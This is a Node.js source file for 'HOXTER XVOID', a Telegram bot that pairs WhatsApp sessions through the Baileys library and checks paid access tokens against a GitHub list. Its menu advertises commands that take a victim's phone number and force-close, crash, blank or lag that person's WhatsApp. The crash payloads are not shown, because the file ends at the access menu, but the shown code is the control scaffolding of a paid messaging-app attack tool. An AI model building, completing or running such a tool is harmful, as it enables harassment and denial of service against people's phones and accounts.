const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const os = require("os");
const vm = require("vm");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const { spawnSync } = require("child_process");

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/ridzz-oss/data/refs/heads/main/base.json"; //Isi raw github elu

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak ada dalam database\nhubungi owner @xoayanya meminta akses"));
    console.log(chalk.red("YAELAH LU MAU MALING CIL"));
    console.log(chalk.red("#MISKIN AMAT YATIMM"));
    process.exit(1);
  }

  console.log(chalk.green(` # Token valid bot siap di jalankan⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.clear();
  console.log(chalk.red(`
⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣛⣛⣟⢩⣍⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢟⣉⠋⠉⠻⣿⣿⣿⡿⠋⠡⠃⠋⠩⠉⠁⢈⠉  ⠈⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣦⡠⣤⣋⠉  ⣠⣦⠲⣮⡳⣦⡊⠢⡀⠂⢑⠱⡀⢙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡎⢉⠴⣀⠂⠇⢿⣧⠱⡝⢏⠈⡀⠜⣆ ⡇ ⡀⣀⢙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⡘⢀⠸⢺ ⠸⣨⡛⠇ ⡌⠆⢿⣌⠈⠄⠃⡀⠐⢈ ⠾⣭⣟⡻⢿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⠃ ⠘⢰  ⡁⠐⢟⠁⠇ ⢀⠙⠦ ⡆⢸ ⠈⠢⣀⠺⠽⢿⣿⣞⡽⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿ ⢠ ⢸⢰ ⠂ ⠘⡄⢨⢸⠸⠛   ⠘  ⢍⠒⠿⢒⣤⣾⣿⣿⠗⣾⣶⠽⡻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡄ ⠸⠚⠰⠧ ⠰⣤⣄⠈⣀⢄⢤⣈⢂⢀   ⠈⣠⣬⣶⣝⡻⢿⡟⣸⣿⣿⣿⣾⣔⡝⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⡇⠁ ⠂ ⠰⠄⣄⣾⡟⣾⣿⣿⣿⣧⠏  ⡠⡆⡄⣿⣿⣿⣿⣿⣷⣭⡻⢿⣿⣿⣿⣿⣿⣿⣮⡻
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⡇⠐   ⡈⢿⣿⣿⣿⣿⣿⣿⣿⣤⠖  ⡀⠁⠇⣿⣿⣿⣿⣿⣿⣿⢛⢡⣶⣶⣾⣿⣿⣿⡿⣳
⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⡠ ⠐⢠⣀⢠⡸⢿⣿⣿⣯⣾⡿⡋⣴⢃⡜ ⠄⢰⣿⣟⠿⠟⣋⣤⣾⣿⣿⣿⣿⣿⣿⡿⢛⣽⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⣵⡄ ⠣⢆⢿⣷⣎⣽⣛⣫⣞⡉⠂⢈⡠⢀⣪⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⢟⣯⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡀⣀⣀⡀⣁⠂⢿⣿⣿⣿⣷⣄⠚⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠩⣽⣿⣿⣿⣿⣦⣌⠛⠟⣿⣿⣿⠿⣛⣭⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣊⢯⣻⣿⣿⣿⣿⣿⣿⣿⣷⡈⠻⢿⣿⣟⢿⣿⣷⣦⣉⠩⢶⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢚⣷⣽⣿⣿⣿⣿⣿⣿⣿⠃ ⢀⠉⠻⣷⣜⢿⣿⣿⣷ ⠘⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⡟     ⠈⢻⣷⣻⣿⣏⣾⡀ ⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⡟  ⠐     ⢻⡇⡿⣼⣿⡇  ⠂⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⠟         ⠈⡇⡚⣿⣿⠂   ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠿⠿⠇           ⢹⣿⡿⠃   ⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣇⣶⣼⣾⣷⣶⣦⣤⣀⣀⣂⣀⣠⣤⣶⣤⢍  ⣀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣭⣷⣶⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡟⢰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⠟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡫⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⣿⣿⣿⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢟⠄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⢀  ⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠇⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⣰⠇ ⠈⡈⣦⠄⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣶ ⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣏⠰⣿  ⢧⠃⢸⣿⣾⣦⣄            ⣠⣶⣾⣿⣿⠂ ⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡦⣬⣤⣧⠘⣁⡈⠻⣿⣿⣿⣷⣄       ⣀⣴⣿⣿⣿⣿⣿⣿ ⡠⡸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⣿⣿⣿⡇⠘⣿⣆⠹⣿⣿⣿⣿⣷⡄  ⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿ ⡽⣦⡀⢈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡼⣿⣿⣷⣦⣿⣿⣄⢻⣿⣿⣿⣿⣇⢿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣯⣟⣿⣄⣓⣻⢭⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
`));
console.log(chalk.blue(`✘━━━━━━━━━━━━━━━━━━━━✘
DEVELOPER : @Fuckyatim
BOT NAME : HOXTER XVOID
VERSION 1.0 
✘━━━━━━━━━━━━━━━━━━━━✘
`));
console.log(chalk.red(`YAILAH BLOM KE DETEK CILL👽`));
console.log(chalk.red(`MENDING BUY ACCESS KE @xoayanya`));
console.log(chalk.yellow(`TAPI BOONGGGGGGGG`));
console.log(chalk.green(`BOT BERHASIL TERHUBUNG..`));
};
validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.red(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.blue(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
 ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ :  ${botNumber}.....
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\` ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ : ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴘᴀɪʀɪɴɢ\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\` ᴘᴀɪʀɪɴɢ sᴜᴄᴄᴇs ɴᴏᴍᴏʀ ${botNumber}\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          
            const code = await sock.requestPairingCode(botNumber);
const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

          await bot.editMessageText(
            `
\`\`\` ᴘᴀɪʀɪɴɢ ʙᴏᴛ \`\`\`
ᴄᴏᴅᴇ ᴘᴀɪʀɪɴɢ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://ibb.co.com/39TLHrck",
        "https://ibb.co.com/39TLHrck",
  ];
  return images[Math.floor(Math.random() * images.length)];
}



// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ Bukan";
  }
}

function cekWaStatus(sock) {
  return sock?.user
    ? "✅ Terhubung"
    : "❌ Tidak Terhubung";
}

//Tamat!!

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
const bars = [
  { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 120 },
  { bar: "▰▰▱▱▱▱▱▱▱ 25%", delay: 150 },
  { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 120 },
  { bar: "▰▰▰▰▱▱▱▱▱ 55%", delay: 150 },
  { bar: "▰▰▰▰▰▱▱▱▱ 70%", delay: 120 },
  { bar: "▰▰▰▰▰▰▱▱▱ 85%", delay: 150 },
  { bar: "▰▰▰▰▰▰▰▰▱ 95%", delay: 120 },
  { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅", delay: 150 }
];

async function runProgressBar(chatId) {
  try {
    const sent = await bot.sendMessage(
      chatId,
      "⏳ Preparing menu...\n\n▱▱▱▱▱▱▱▱▱ 0%"
    );

    const msgId = sent.message_id;

    for (const step of bars) {
      await new Promise(res => setTimeout(res, step.delay));
      await bot.editMessageText(
        `⏳ Preparing menu...\n\n${step.bar}`,
        { chat_id: chatId, message_id: msgId }
      );
    }

    return msgId;
  } catch (e) {
    return null; // kalau gagal, lanjut saja
  }
}
bot.onText(/\/start|\/p|start|menu|rey/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  const loadingMsgId = await runProgressBar(chatId);
    if (loadingMsgId) {
      await bot.deleteMessage(chatId, loadingMsgId).catch(() => {});
    }
    
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const dragon = await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون. <tg-emoji emoji-id="5465206035729906349">🐈‍⬛</tg-emoji>
</blockquote>
`,
    parse_mode: "HTML",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
        [
         { text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘", callback_data: "bug_show", style: "danger", icon_custom_emoji_id: "5893257006323603821" },
         ],
         [
         { text: "✦•┈", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
          { text: "༺♱༻", callback_data: "tqto", style: "success", icon_custom_emoji_id: "4936468614967460670" },
          { text: "┈•✦", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
         ],
         [
          { text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨", callback_data: "akses", style: "primary", icon_custom_emoji_id: "5420323339723881652" },
          { text: "𝗛𝗔𝗥𝗚𝗔 ⌂ 𝗦𝗖𝗥𝗜𝗣𝗧", callback_data: "harga", style: "primary", icon_custom_emoji_id: "5409048419211682843" },
         ],
         [
          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Fuckyaetim", style: "danger", icon_custom_emoji_id: "6269255258212404947" },
          { text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥", url: "https://t.me/Fuckyatim", style: "danger", icon_custom_emoji_id: "6269048584386122161" },
         ]
        ]
    }
  });
  await bot.sendAudio(
    chatId,
    fs.createReadStream("audio/Music.mp3"),
    {
        title: "HOXTER XVOID",
        performer: "チャネルアクセス"
    }
).catch(()=>{})
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const senderId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_show") {
  caption = `
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
┗━━━━━━━━━━━━━━⪼
┏━━⪼ [ 𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘 ]
┃<b>⋅𖤓⋅ /HoxterFc - 628xx [Forclose]</b>
┃<b>⋅𖤓⋅ /HoxterCrash - 628xx [Crash]</b>
┃<b>⋅𖤓⋅ /BlankHxt - 628xx [BLANK]</b>
┃<b>⋅𖤓⋅ /HoxterVip - 628xx [ DELAY FOR MURBUG]</b>
┃<b>⋅𖤓⋅ /xspam - 628xx [ DELAY FOR MURBUG]</b>
┃<b>⋅𖤓⋅ /delayvloid - 628xx [ DELAY HARD ]</b>
┃<b>⋅𖤓⋅ /delayinvis -628xx [ DELAY INVIS ]</b>
┃<b>⋅𖤓⋅ /delayhard - 628xx [ DELAY HARD ]</b>
┗━━━━━━━━━━━━━━━━━━━━━━━━━⪼</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
    } 
 
    if (query.data === "akses") {
      caption = `
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
┗━━━━━━━━━━━━━━⪼
┏━━⪼ [ 𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨 ]
┃<b>⋅𖤓⋅ /addbot - Add Sender</b>
